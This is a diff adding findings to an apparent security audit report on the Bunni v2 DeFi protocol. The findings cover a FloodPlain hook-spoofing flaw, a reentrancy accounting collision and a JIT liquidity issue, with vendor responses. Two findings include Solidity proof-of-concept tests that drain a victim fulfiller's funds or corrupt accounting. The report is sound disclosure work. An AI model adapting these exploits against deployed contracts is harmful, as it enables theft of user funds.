@@ -782,6 +782,214 @@ Logs:
 **Cyfrin:** Acknowledged. This will result in regular losses of potential yield as the deposit to the target ratios will not occur until the surge fee is such that swappers are no longer disincentivized, but it is understood to be accepted that the subsequent swap will trigger the deposit.
 
 \clearpage
+## High Risk
+
+
+### `FloodPlain` selector extension does not prevent `IFulfiller::sourceConsideration` callback from being called within pre/post hooks
+
+**Description:** The `FloodPlain` contracts implement a check in `Hooks::execute` which intends to prevent spoofing by invoking the fulfiller callback during execution of the pre/post hooks:
+
+```solidity
+    bytes28 constant SELECTOR_EXTENSION = bytes28(keccak256("IFulfiller.sourceConsiderations"));
+
+    library Hooks {
+        function execute(IFloodPlain.Hook calldata hook, bytes32 orderHash, address permit2) internal {
+            address target = hook.target;
+            bytes calldata data = hook.data;
+
+            bytes28 extension; // @audit - an attacker can control this value to pass the below check
+            assembly ("memory-safe") {
+                extension := shl(32, calldataload(data.offset)) // @audit - this shifts off the first 4 bytes of the calldata, which is the `sourceConsideration()` function selector. thus preventing a call to either `sourceConsideration()` or `sourceConsiderations()` relies on the fulfiller requiring the `selectorExtension` argument to be `SELECTOR_EXTENSION`
+            }
+@>          require(extension != SELECTOR_EXTENSION && target != permit2, "MALICIOUS_CALL");
+
+            assembly ("memory-safe") {
+                let fmp := mload(0x40)
+                calldatacopy(fmp, data.offset, data.length)
+                mstore(add(fmp, data.length), orderHash)
+                if iszero(call(gas(), target, 0, fmp, add(data.length, 32), 0, 0)) {
+                    returndatacopy(0, 0, returndatasize())
+                    revert(0, returndatasize())
+                }
+            }
+        }
+        ...
+    }
+```
+
+However, the `SELECTOR_EXTENSION` constant simply acts as a sort of "magic value" as it does not actually contain the hashed function signature. As such, assuming fulfillers validate selector extension argument against this expected value, this only prevent calls using the `IFulfiller::sourceConsiderations` interface and not `IFulfiller.sourceConsideration`. Therefore, a malicious Flood order can be fulfilled and used to target a victim fulfiller by executing the arbitrary external call during the pre/post hooks. If the caller is not explicitly validated, then it is possible that this call will be accepted by the fulfiller and potentially result in dangling approvals that can be later exploited. Additionally, this same selector extension is passed to the `IFulfiller::sourceConsideration` callback in both overloaded versions of `FloodPlain::fulfillOrder` when this should ostensibly be `bytes28(keccak256("IFulfiller.sourceConsideration"))`.
+
+While the code is not currently public, this is the case for the Bunni rebalancer that simply only checks that `msg.sender` is the Flood contract and ignores the`selectorExtension` and `caller` parameters. As a result, it can be tricked into decoding an attacker-controlled address to which an infinite approval is made for the offer token. The malicious Flood order can freely control both the Flood order and accompanying context, meaning that they can drain any token inventory held by the rebalancer.
+
+**Impact:** Malicious Flood orders can spoof the `FloodPlain` address by invoking the `IFulfiller::sourceConsideration` callback during execution of the pre/post hooks.
+
+**Proof of Concept:** The following test can be added to the Flood.bid library tests in `Hooks.t.sol`:
+
+```solidity
+function test_RevertWhenSelectorExtensionClashSourceConsideration(
+        bytes4 data0,
+        bytes calldata data2,
+        bytes32 orderHash,
+        address permit2
+    ) public {
+        vm.assume(permit2 != hooked);
+        bytes28 data1 = bytes28(keccak256("IFulfiller.sourceConsideration")); // note the absence of the final 's'
+        bytes memory data = abi.encodePacked(data0, data1, data2);
+
+        // this actually succeeds, so it is possible to call sourceConsideration on the fulfiller from the hook
+        // with FloodPlain as the sender and any arbitrary caller before the consideration is actually sourced
+        // which can be used to steal approvals from other contracts that integrate with FloodPlain
+        hookHelper.execute(IFloodPlain.Hook({target: address(0x6969696969), data: data}), orderHash, permit2);
+    }
+```
+
+And the standalone test file below demonstrates the full end-to-end issue:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.17;
+
+import "test/utils/FloodPlainTestShared.sol";
+
+import {PermitHash} from "permit2/src/libraries/PermitHash.sol";
+import {OrderHash} from "src/libraries/OrderHash.sol";
+
+import {IFloodPlain} from "src/interfaces/IFloodPlain.sol";
+import {IFulfiller} from "src/interfaces/IFulfiller.sol";
+import {SELECTOR_EXTENSION} from "src/libraries/Hooks.sol";
+
+import {IERC20, SafeERC20} from "@openzeppelin/token/ERC20/utils/SafeERC20.sol";
+import {Address} from "@openzeppelin/utils/Address.sol";
+
+contract ThirdPartyFulfiller is IFulfiller {
+    using SafeERC20 for IERC20;
+    using Address for address payable;
+
+    function sourceConsideration(
+        bytes28 selectorExtension,
+        IFloodPlain.Order calldata order,
+        address, /* caller */
+        bytes calldata /* context */
+    ) external returns (uint256) {
+        require(selectorExtension == bytes28(keccak256("IFulfiller.sourceConsideration")));
+
+        IFloodPlain.Item calldata item = order.consideration;
+        if (item.token == address(0)) payable(msg.sender).sendValue(item.amount);
+        else IERC20(item.token).safeIncreaseAllowance(msg.sender, item.amount);
+
+        return item.amount;
+    }
+
+    function sourceConsiderations(
+        bytes28 selectorExtension,
+        IFloodPlain.Order[] calldata orders,
+        address, /* caller */
+        bytes calldata /* context */
+    ) external returns (uint256[] memory amounts) {
+        require(selectorExtension == SELECTOR_EXTENSION);
+
+        uint256[] memory amounts = new uint256[](orders.length);
+
+        for (uint256 i; i < orders.length; ++i) {
+            IFloodPlain.Order calldata order = orders[i];
+            IFloodPlain.Item calldata item = order.consideration;
+            amounts[i] = item.amount;
+            if (item.token == address(0)) payable(msg.sender).sendValue(item.amount);
+            else IERC20(item.token).safeIncreaseAllowance(msg.sender, item.amount);
+        }
+    }
+}
+
+contract FloodPlainPoC is FloodPlainTestShared {
+    IFulfiller victimFulfiller;
+
+    function setUp() public override {
+        super.setUp();
+        victimFulfiller = new ThirdPartyFulfiller();
+    }
+
+    function test_FraudulentPreHookSourceConsideration() public {
+        // create a malicious order that will call out to a third-party fulfiller in the pre hook
+        // just copied the setup_mostBasicOrder logic for simplicity but this can be a fake order with fake tokens
+        // since it is only the pre hook execution that is interesting here
+
+        deal(address(token0), account0.addr, token0.balanceOf(account0.addr) + 500);
+        deal(address(token1), address(fulfiller), token1.balanceOf(address(fulfiller)) + 500);
+        IFloodPlain.Item[] memory offer = new IFloodPlain.Item[](1);
+        offer[0].token = address(token0);
+        offer[0].amount = 500;
+        uint256 existingAllowance = token0.allowance(account0.addr, address(permit2));
+        vm.prank(account0.addr);
+        token0.approve(address(permit2), existingAllowance + 500);
+        IFloodPlain.Item memory consideration;
+        consideration.token = address(token1);
+        consideration.amount = 500;
+
+        // fund the victim fulfiller with native tokens that we will have it transfer out as the "consideration"
+        uint256 targetAmount = 10 ether;
+        deal(address(victimFulfiller), targetAmount);
+        assertEq(address(victimFulfiller).balance, targetAmount);
+
+        IFloodPlain.Item memory evilConsideration;
+        evilConsideration.token = address(0);
+        evilConsideration.amount = targetAmount;
+
+        // now set up the spoofed sourceConsideration call (note the offer doesn't matter as this is not a legitimate order)
+        IFloodPlain.Hook[] memory preHooks = new IFloodPlain.Hook[](1);
+        IFloodPlain.Order memory maliciousOrder = IFloodPlain.Order({
+            offerer: address(account0.addr),
+            zone: address(0),
+            recipient: account0.addr,
+            offer: offer,
+            consideration: evilConsideration,
+            deadline: type(uint256).max,
+            nonce: 0,
+            preHooks: new IFloodPlain.Hook[](0),
+            postHooks: new IFloodPlain.Hook[](0)
+        });
+        preHooks[0] = IFloodPlain.Hook({
+            target: address(victimFulfiller),
+            data: abi.encodeWithSelector(IFulfiller.sourceConsideration.selector, bytes28(keccak256("IFulfiller.sourceConsideration")), maliciousOrder, address(0), bytes(""))
+        });
+
+        // Construct the fraudulent order.
+        IFloodPlain.Order memory order = IFloodPlain.Order({
+            offerer: address(account0.addr),
+            zone: address(0),
+            recipient: account0.addr,
+            offer: offer,
+            consideration: consideration,
+            deadline: type(uint256).max,
+            nonce: 0,
+            preHooks: preHooks,
+            postHooks: new IFloodPlain.Hook[](0)
+        });
+
+        // Sign the order.
+        bytes memory sig = getSignature(order, account0);
+
+        IFloodPlain.SignedOrder memory signedOrder = IFloodPlain.SignedOrder({order: order, signature: sig});
+
+        deal(address(token1), address(this), 500);
+        token1.approve(address(book), 500);
+
+        // Filling order succeeds and pre hook call invoked sourceConsideration on the vitim fulfiller.
+        book.fulfillOrder(signedOrder);
+        assertEq(address(victimFulfiller).balance, 0);
+    }
+}
+```
+
+**Recommended Mitigation:** Following the [recent acquisition](https://0x.org/post/0x-acquires-flood-to-optimize-trade-execution) of Flood.bid by 0x, it appears that these contracts are no longer maintained. Therefore, without requiring an upstream change, this issue can be mitigated by always validating the `selectorExtension` argument is equal to the `SELECTOR_EXTENSION` constant in the implementation of both `IFulfiller::sourceConsideration` and `IFulfiller::sourceConsiderations`.
+
+**0x:**
+The actual value of `SELECTOR_EXTENSION` is unfortunate but the intent of the code is respected and safe, and its expected for Fulfillers to be the "expert" actors in the system and handle their security well.
+
+**Bacon Labs:** Acknowledged and will fix this later in our rebalancer contract. Realistically there’s currently no impact since our rebalancer does not hold any inventory other than during the execution of an order.
+
+**Cyfrin:** Acknowledged.
+
+\clearpage
 ## Medium Risk
 
 
@@ -2450,6 +2658,435 @@ As can be observed from the logs, there is a significant difference in the sqrt 
 **Bacon Labs:** Acknowledged, we’re okay with assuming that the bond & the stablecoin will have the same decimals.
 
 **Cyfrin:** Acknowledged.
+
+
+### Collision between rebalance order consideration tokens and am-AMM fees for Bunni pools using Bunni tokens
+
+**Description:** `AmAmm` rent for a given Bunni pool is paid and stored in the `BunniHook` as the ERC-20 representation of its corresponding Bunni token. For pools comprised of at least one underlying Bunni token, there can be issues in the `BunniHook` accounting due to a collision in certain edge cases between the ERC-20 balances. Specifically, a malicious fulfiller who performs an am-AMM bid during the `IFulfiller::sourceConsideration` callback can force additional Bunni token to be accounted to the hook from the hub than should be possible due to inflation of the `orderOutputAmount` state.
+
+```solidity
+    /* pre-hook: cache output balance */
+    // store the order output balance before the order execution in transient storage
+    // this is used to compute the order output amount
+    uint256 outputBalanceBefore = hookArgs.postHookArgs.currency.isAddressZero()
+        ? weth.balanceOf(address(this))
+        : hookArgs.postHookArgs.currency.balanceOfSelf();
+    assembly ("memory-safe") {
+@>      tstore(REBALANCE_OUTPUT_BALANCE_SLOT, outputBalanceBefore)
+    }
+
+    /* am-amm bid is performed during sourceConsideration */
+
+    /* post-hook: compute order output amount by deducting cached balance from current balance (doesn't account for am-amm rent */
+    // compute order output amount by computing the difference in the output token balance
+    uint256 orderOutputAmount;
+    uint256 outputBalanceBefore;
+    assembly ("memory-safe") {
+@>      outputBalanceBefore := tload(REBALANCE_OUTPUT_BALANCE_SLOT)
+    }
+    if (args.currency.isAddressZero()) {
+        // unwrap WETH output to native ETH
+        orderOutputAmount = weth.balanceOf(address(this));
+        weth.withdraw(orderOutputAmount);
+    } else {
+@>      orderOutputAmount = args.currency.balanceOfSelf();
+    }
+@>  orderOutputAmount -= outputBalanceBefore;
+```
+
+**Impact:** Core accounting can be broken due to re-entrant actions taken in the `BunniHook` during rebalance order fulfilment.
+
+**Proof of Concept:** The following tests demonstrate how this incorrect accounting assumption can result in incorrect behavior:
+
+```solidity
+// SPDX-License-Identifier: AGPL-3.0
+pragma solidity ^0.8.15;
+
+import "./BaseTest.sol";
+import "./mocks/BasicBunniRebalancer.sol";
+
+import "flood-contracts/src/interfaces/IFloodPlain.sol";
+
+contract RebalanceWithBunniLiqTest is BaseTest {
+    BasicBunniRebalancer public rebalancer;
+
+    function setUp() public override {
+        super.setUp();
+
+        rebalancer = new BasicBunniRebalancer(poolManager, floodPlain);
+        zone.setIsWhitelisted(address(rebalancer), true);
+    }
+
+    function test_rebalance_withBunniLiq() public {
+        MockLDF ldf_ = new MockLDF(address(hub), address(bunniHook), address(quoter));
+        bytes32 ldfParams = bytes32(abi.encodePacked(ShiftMode.BOTH, int24(-3) * TICK_SPACING, int16(6), ALPHA));
+        ldf_.setMinTick(-30);
+
+        (, PoolKey memory key) = _deployPoolAndInitLiquidity(ldf_, ldfParams);
+
+        // shift liquidity to the right
+        // the LDF will demand more token0, so we'll have too much of token1
+        ldf_.setMinTick(-20);
+
+        // make swap to trigger rebalance
+        uint256 swapAmount = 1e6;
+        _mint(key.currency0, address(this), swapAmount);
+        IPoolManager.SwapParams memory params = IPoolManager.SwapParams({
+            zeroForOne: true,
+            amountSpecified: -int256(swapAmount),
+            sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
+        });
+        vm.recordLogs();
+        _swap(key, params, 0, "");
+
+        IdleBalance idleBalanceBefore = hub.idleBalance(key.toId());
+        (uint256 balanceBefore, bool isToken0Before) = idleBalanceBefore.fromIdleBalance();
+        assertGt(balanceBefore, 0, "idle balance should be non-zero");
+        assertFalse(isToken0Before, "idle balance should be in token1");
+
+        // obtain the order from the logs
+        Vm.Log[] memory logs_ = vm.getRecordedLogs();
+        Vm.Log memory orderEtchedLog;
+        for (uint256 i = 0; i < logs_.length; i++) {
+            if (logs_[i].emitter == address(floodPlain) && logs_[i].topics[0] == IOnChainOrders.OrderEtched.selector) {
+                orderEtchedLog = logs_[i];
+                break;
+            }
+        }
+        IFloodPlain.SignedOrder memory signedOrder = abi.decode(orderEtchedLog.data, (IFloodPlain.SignedOrder));
+
+        // wait for the surge fee to go down
+        skip(9 minutes);
+
+        // fulfill order using rebalancer
+        rebalancer.rebalance(signedOrder, key);
+
+        // rebalancer should have profits in token1
+        assertGt(token1.balanceOf(address(rebalancer)), 0, "rebalancer should have profits");
+    }
+
+    function test_outputExcessiveBidTokensDuringRebalanceAndRefund() public {
+        // Step 1: Create a new pool
+        (IBunniToken bt1, PoolKey memory poolKey1) = _deployPoolAndInitLiquidity();
+
+        // Step 2: Send bids and rent tokens (BT1) to BunniHook
+        uint128 minRent = uint128(bt1.totalSupply() * MIN_RENT_MULTIPLIER / 1e18);
+        uint128 bidAmount = minRent * 10 days;
+        address alice = makeAddr("Alice");
+        deal(address(bt1), address(this), bidAmount);
+        bt1.approve(address(bunniHook), bidAmount);
+        bunniHook.bid(
+            poolKey1.toId(), address(alice), bytes6(abi.encodePacked(uint24(1e3), uint24(2e3))), minRent, bidAmount
+        );
+
+        // Step 3: Create a new pool with BT1 and token2
+        ERC20Mock token2 = new ERC20Mock();
+        MockLDF mockLDF = new MockLDF(address(hub), address(bunniHook), address(quoter));
+        mockLDF.setMinTick(-30); // minTick of MockLDFs need initialization
+
+        // approve tokens
+        vm.startPrank(address(0x6969));
+        bt1.approve(address(PERMIT2), type(uint256).max);
+        token2.approve(address(PERMIT2), type(uint256).max);
+        PERMIT2.approve(address(bt1), address(hub), type(uint160).max, type(uint48).max);
+        PERMIT2.approve(address(token2), address(hub), type(uint160).max, type(uint48).max);
+        vm.stopPrank();
+
+        (Currency currency0, Currency currency1) = address(bt1) < address(token2)
+            ? (Currency.wrap(address(bt1)), Currency.wrap(address(token2)))
+            : (Currency.wrap(address(token2)), Currency.wrap(address(bt1)));
+        (, PoolKey memory poolKey2) = _deployPoolAndInitLiquidity(
+            currency0,
+            currency1,
+            ERC4626(address(0)),
+            ERC4626(address(0)),
+            mockLDF,
+            IHooklet(address(0)),
+            bytes32(abi.encodePacked(ShiftMode.BOTH, int24(-3) * TICK_SPACING, int16(6), ALPHA)),
+            abi.encodePacked(
+                FEE_MIN,
+                FEE_MAX,
+                FEE_QUADRATIC_MULTIPLIER,
+                FEE_TWAP_SECONDS_AGO,
+                POOL_MAX_AMAMM_FEE,
+                SURGE_HALFLIFE,
+                SURGE_AUTOSTART_TIME,
+                VAULT_SURGE_THRESHOLD_0,
+                VAULT_SURGE_THRESHOLD_1,
+                REBALANCE_THRESHOLD,
+                REBALANCE_MAX_SLIPPAGE,
+                REBALANCE_TWAP_SECONDS_AGO,
+                REBALANCE_ORDER_TTL,
+                true, // amAmmEnabled
+                ORACLE_MIN_INTERVAL,
+                MIN_RENT_MULTIPLIER
+            ),
+            bytes32(uint256(1))
+        );
+
+        // Step 4: Trigger a rebalance for the recursive pool
+        // Shift liquidity to create an imbalance such that we need to swap token2 into bt1
+        // Shift right if bt1 is token0, shift left if bt1 is token1
+        mockLDF.setMinTick(address(bt1) < address(token2) ? -20 : -40);
+
+        // Make a small swap to trigger rebalance
+        uint256 swapAmount = 1e6;
+        deal(address(bt1), address(this), swapAmount);
+        bt1.approve(address(swapper), swapAmount);
+        IPoolManager.SwapParams memory params = IPoolManager.SwapParams({
+            zeroForOne: address(bt1) < address(token2),
+            amountSpecified: -int256(swapAmount),
+            sqrtPriceLimitX96: address(bt1) < address(token2) ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1
+        });
+
+        // Record logs to capture the OrderEtched event
+        vm.recordLogs();
+        swapper.swap(poolKey2, params, type(uint256).max, 0);
+
+        // Find the OrderEtched event
+        Vm.Log[] memory logs_ = vm.getRecordedLogs();
+        Vm.Log memory orderEtchedLog;
+        for (uint256 i = 0; i < logs_.length; i++) {
+            if (logs_[i].emitter == address(floodPlain) && logs_[i].topics[0] == IOnChainOrders.OrderEtched.selector) {
+                orderEtchedLog = logs_[i];
+                break;
+            }
+        }
+        require(orderEtchedLog.emitter == address(floodPlain), "OrderEtched event not found");
+
+        // Decode the order from the event
+        IFloodPlain.SignedOrder memory signedOrder = abi.decode(orderEtchedLog.data, (IFloodPlain.SignedOrder));
+        IFloodPlain.Order memory order = signedOrder.order;
+        assertEq(order.offer[0].token, address(token2), "Order offer token should be token2");
+        assertEq(order.consideration.token, address(bt1), "Order consideration token should be BT1");
+
+        // Step 5: Prepare to fulfill order and slightly increase bid during source consideration
+        uint256 bunniHookBalanceBefore = bt1.balanceOf(address(bunniHook));
+        console2.log("BunniHook BT1 balance before rebalance:", bt1.balanceOf(address(bunniHook)));
+        console2.log(
+            "BunniHub BT1 6909 balance before rebalance:",
+            poolManager.balanceOf(address(hub), Currency.wrap(address(bt1)).toId())
+        );
+
+        console2.log("BunniHook token2 balance before rebalance:", token2.balanceOf(address(bunniHook)));
+        console2.log(
+            "BunniHub token2 6909 balance before rebalance:",
+            poolManager.balanceOf(address(hub), Currency.wrap(address(token2)).toId())
+        );
+
+        // slightly exceed the bid amount
+        uint128 minRent1 = minRent * 1.11e18 / 1e18;
+        uint128 bidAmount1 = minRent1 * 10 days;
+        assertEq(bidAmount1 % minRent1, 0, "bidAmount1 should be a multiple of minRent");
+        deal(address(bt1), address(this), order.consideration.amount + bidAmount1);
+        bt1.approve(address(floodPlain), order.consideration.amount);
+        bt1.approve(address(bunniHook), bidAmount1);
+
+        console2.log("address(this) bt1 balance before rebalance:", bt1.balanceOf(address(this)));
+
+        // Fulfill the rebalance order
+        floodPlain.fulfillOrder(signedOrder, address(this), abi.encode(true, bunniHook, poolKey1, minRent1, bidAmount1));
+
+        // alice exceeds the bid amount again
+        uint128 mintRent2 = minRent1 * 1.11e18 / 1e18;
+        uint128 bidAmount2 = mintRent2 * 10 days;
+        deal(address(bt1), address(this), bidAmount2);
+        bt1.approve(address(bunniHook), bidAmount2);
+        bunniHook.bid(poolKey1.toId(), alice, bytes6(abi.encodePacked(uint24(1e3), uint24(2e3))), mintRent2, bidAmount2);
+
+        // make a claim
+        bunniHook.claimRefund(poolKey1.toId(), address(this));
+
+        console2.log("BunniHook BT1 balance after rebalance and refund:", bt1.balanceOf(address(bunniHook)));
+        console2.log("BunniHook token2 balance after rebalance and refund:", token2.balanceOf(address(bunniHook)));
+
+        console2.log(
+            "BunniHub BT1 6909 balance after rebalance and refund:",
+            poolManager.balanceOf(address(hub), Currency.wrap(address(bt1)).toId())
+        );
+        console2.log(
+            "BunniHub token2 6909 balance after rebalance and refund:",
+            poolManager.balanceOf(address(hub), Currency.wrap(address(token2)).toId())
+        );
+
+        console2.log("address(this) BT1 balance after refund:", bt1.balanceOf(address(this)));
+        console2.log("address(this) token2 balance after refund:", token2.balanceOf(address(this)));
+
+        console2.log(
+            "address(this) gained BT1 balance after rebalance and refund:",
+            bt1.balanceOf(address(address(this))) - bidAmount1
+        ); // consideration amount was swapped for token2
+        console2.log(
+            "BunniHook gained BT1 balance after rebalance and refund:",
+            bt1.balanceOf(address(bunniHook)) - bunniHookBalanceBefore
+        );
+    }
+
+    // Implementation of IFulfiller interface
+    function sourceConsideration(
+        bytes28, /* selectorExtension */
+        IFloodPlain.Order calldata order,
+        address, /* caller */
+        bytes calldata data
+    ) external returns (uint256) {
+        bool isFirst = abi.decode(data[:32], (bool));
+        bytes memory context = data[32:];
+
+        if (isFirst) {
+            (BunniHook bunniHook, PoolKey memory poolKey1, uint128 rent, uint128 bid) =
+                abi.decode(context, (BunniHook, PoolKey, uint128, uint128));
+
+            console2.log(
+                "BunniHook BT1 balance before bid in sourceConsideration:",
+                ERC20Mock(order.consideration.token).balanceOf(address(bunniHook))
+            );
+
+            bunniHook.bid(poolKey1.toId(), address(this), bytes6(abi.encodePacked(uint24(1e3), uint24(2e3))), rent, bid);
+
+            console2.log(
+                "BunniHook BT1 balance after bid in sourceConsideration:",
+                ERC20Mock(order.consideration.token).balanceOf(address(bunniHook))
+            );
+        } else {
+            (bytes32 poolId, address bunniToken) = abi.decode(context, (bytes32, address));
+            IERC20(order.consideration.token).approve(msg.sender, order.consideration.amount);
+            uint128 minRent = uint128(IERC20(bunniToken).totalSupply() * 1e10 / 1e18);
+            uint128 deposit = uint128(7200 * minRent);
+            IERC20(order.consideration.token).approve(address(bunniHook), uint256(deposit));
+            bunniHook.bid(PoolId.wrap(poolId), address(this), bytes6(0), minRent, deposit);
+            return order.consideration.amount;
+        }
+
+        return order.consideration.amount;
+    }
+
+    function test_normalBidding() external {
+        (IBunniToken bt1, PoolKey memory poolKey1) =
+            _deployPoolAndInitLiquidity(Currency.wrap(address(token0)), Currency.wrap(address(token1)));
+        deal(address(bt1), address(this), 100e18);
+        uint128 minRent = uint128(IERC20(bt1).totalSupply() * 1e10 / 1e18);
+        uint128 deposit = uint128(7200 * minRent);
+        IERC20(address(bt1)).approve(address(bunniHook), uint256(deposit));
+        bunniHook.bid(poolKey1.toId(), address(this), bytes6(0), minRent, deposit);
+    }
+
+    function test_doubleBunniTokenAccountingRevert() external {
+        // swapAmount = bound(swapAmount, 1e6, 1e9);
+        // feeMin = uint24(bound(feeMin, 2e5, 1e6 - 1));
+        // feeMax = uint24(bound(feeMax, feeMin, 1e6 - 1));
+        // alpha = uint32(bound(alpha, 1e3, 12e8));
+        uint256 swapAmount = 496578468;
+        uint24 feeMin = 800071;
+        uint24 feeMax = 996693;
+        uint32 alpha = 61123954;
+        bool zeroForOne = true;
+        uint24 feeQuadraticMultiplier = 18;
+
+        uint256 counter;
+        IBunniToken bt1 = IBunniToken(address(0));
+        PoolKey memory poolKey1;
+        while (address(bt1) < address(token0)) {
+            (bt1, poolKey1) = _deployPoolAndInitLiquidity(
+                Currency.wrap(address(token0)),
+                Currency.wrap(address(token1)),
+                bytes32(keccak256(abi.encode(counter++)))
+            );
+        }
+
+        MockLDF ldf_ = new MockLDF(address(hub), address(bunniHook), address(quoter));
+        bytes32 ldfParams = bytes32(abi.encodePacked(ShiftMode.BOTH, int24(-3) * TICK_SPACING, int16(6), alpha));
+        {
+            PoolKey memory key_;
+            key_.tickSpacing = TICK_SPACING;
+            vm.assume(ldf_.isValidParams(key_, TWAP_SECONDS_AGO, ldfParams, LDFType.DYNAMIC_AND_STATEFUL));
+        }
+        ldf_.setMinTick(-30); // minTick of MockLDFs need initialization
+        vm.startPrank(address(0x6969));
+        IERC20(address(bt1)).approve(address(hub), type(uint256).max);
+        IERC20(address(token0)).approve(address(hub), type(uint256).max);
+        vm.stopPrank();
+        (, PoolKey memory key) = _deployPoolAndInitLiquidity(
+            Currency.wrap(address(token0)),
+            Currency.wrap(address(bt1)),
+            ERC4626(address(0)),
+            ERC4626(address(0)),
+            ldf_,
+            IHooklet(address(0)),
+            ldfParams,
+            abi.encodePacked(
+                feeMin,
+                feeMax,
+                feeQuadraticMultiplier,
+                FEE_TWAP_SECONDS_AGO,
+                POOL_MAX_AMAMM_FEE,
+                SURGE_HALFLIFE,
+                SURGE_AUTOSTART_TIME,
+                VAULT_SURGE_THRESHOLD_0,
+                VAULT_SURGE_THRESHOLD_1,
+                REBALANCE_THRESHOLD,
+                REBALANCE_MAX_SLIPPAGE,
+                REBALANCE_TWAP_SECONDS_AGO,
+                REBALANCE_ORDER_TTL,
+                true, // amAmmEnabled
+                ORACLE_MIN_INTERVAL,
+                MIN_RENT_MULTIPLIER
+            ),
+            bytes32(keccak256("random")) // salt
+        );
+
+        // shift liquidity based on direction
+        // for zeroForOne: shift left, LDF will demand more token1, so we'll have too much of token0
+        // for oneForZero: shift right, LDF will demand more token0, so we'll have too much of token1
+        ldf_.setMinTick(zeroForOne ? -40 : -20);
+
+        // Define currencyIn and currencyOut based on direction
+        Currency currencyIn = zeroForOne ? key.currency0 : key.currency1;
+        Currency currencyOut = zeroForOne ? key.currency1 : key.currency0;
+        Currency currencyInRaw = zeroForOne ? key.currency0 : key.currency1;
+        Currency currencyOutRaw = zeroForOne ? key.currency1 : key.currency0;
+
+        // make small swap to trigger rebalance
+        _mint(key.currency0, address(this), swapAmount);
+        vm.prank(address(this));
+        IERC20(Currency.unwrap(key.currency0)).approve(address(swapper), type(uint256).max);
+        IPoolManager.SwapParams memory params = IPoolManager.SwapParams({
+            zeroForOne: zeroForOne,
+            amountSpecified: -int256(swapAmount),
+            sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
+        });
+        vm.recordLogs();
+        _swap(key, params, 0, "");
+
+        // validate etched order
+        Vm.Log[] memory logs = vm.getRecordedLogs();
+        Vm.Log memory orderEtchedLog;
+        for (uint256 i = 0; i < logs.length; i++) {
+            if (logs[i].emitter == address(floodPlain) && logs[i].topics[0] == IOnChainOrders.OrderEtched.selector) {
+                orderEtchedLog = logs[i];
+                break;
+            }
+        }
+        IFloodPlain.SignedOrder memory signedOrder = abi.decode(orderEtchedLog.data, (IFloodPlain.SignedOrder));
+        IFloodPlain.Order memory order = signedOrder.order;
+
+        // if there is no weth held in the contract, the rebalancing succeeds
+        _mint(currencyOut, address(this), order.consideration.amount * 2);
+        floodPlain.fulfillOrder(signedOrder, address(this), abi.encode(false, poolKey1.toId(), address(bt1)));
+        vm.roll(vm.getBlockNumber() + 7200);
+        bunniHook.getBidWrite(poolKey1.toId(), true);
+        vm.roll(vm.getBlockNumber() + 7200);
+        // reverts as there is insufficient token balance
+        vm.expectRevert();
+        bunniHook.getBidWrite(poolKey1.toId(), true);
+    }
+}
+```
+
+**Recommended Mitigation:** Consider overriding all virtual functions to include the re-entrancy guard that is locked when `rebalanceOrderHook()` is called.
+
+**Bacon Labs:** Fixed in commit [75de098](https://github.com/timeless-fi/bunni-v2/pull/118/commits/75de098e79b268f65fbd4d9be72cb9041640a43e).
+
+**Cyfrin:** Verified. The `AmAmm` functions have been overridden to be non-reentrant and disabled during active fulfilment of a rebalance order.
 
 \clearpage
 ## Low Risk
@@ -4506,6 +5143,15 @@ function test_liquidityDensity_sumUpToOneGeometricDistribution(int24 tickSpacing
 **Bacon Labs:** Fixed the LibCarpetedDoubleGeometricDistribution rounding issue in [PR \#127](https://github.com/timeless-fi/bunni-v2/pull/127). Agreed that the total density slightly exceeding `Q96` is fine.
 
 **Cyfrin:** Verified, carpet liquidity is now rounded up in `LibCarpetedDoubleGeometricDistribution::liquidityDensityX96`.
+
+
+### Just in time (JIT) liquidity can be used to inflate rebalance order amounts
+
+**Description:** As reported in the Trail of Bits audit, the addition of JIT liquidity before a swap that would trigger a rebalance order can inflate the amount required fulfil the order beyond that which would typically be within the pool. With the modification to allow Bunni liquidity to be used during fulfilment of rebalance orders, this has implications for both the pool being rebalanced and liquidity from any other pools that are used in this process. Ultimately, this can in certain scenarios require the fulfiller to provide JIT liquidity of their own to carry out the rebalance, resulting in a less profitable fulfilment than expected and potentially DoS'ing withdrawals in other pools. The profitable addition of JIT liquidity by an attacker is however realistically quite unlikely, especially as it is not possible to perform any action after the rebalance order fulfilment during the same transaction since the transient re-entrancy guard will remain locked. Additionally, it is not possible to withdraw the liquidity before the rebalance order is either process or expired (in which case it is recalculated) unless the `withdrawalUnblocked` override is set. Even still, this may result in undesirable behavior such as leaving the pool originally intended to be rebalanced in an unbalanced state and so should be carefully considered before deploying to production.
+
+**Bacon Labs:** Acknowledged. We agree that the issue is unlikely to occur in practice due to both the lack of a profit motive and the lack of a clear impact on the pool operations.
+
+**Cyfrin:** Acknowledged.
 
 \clearpage
 ## Gas Optimization
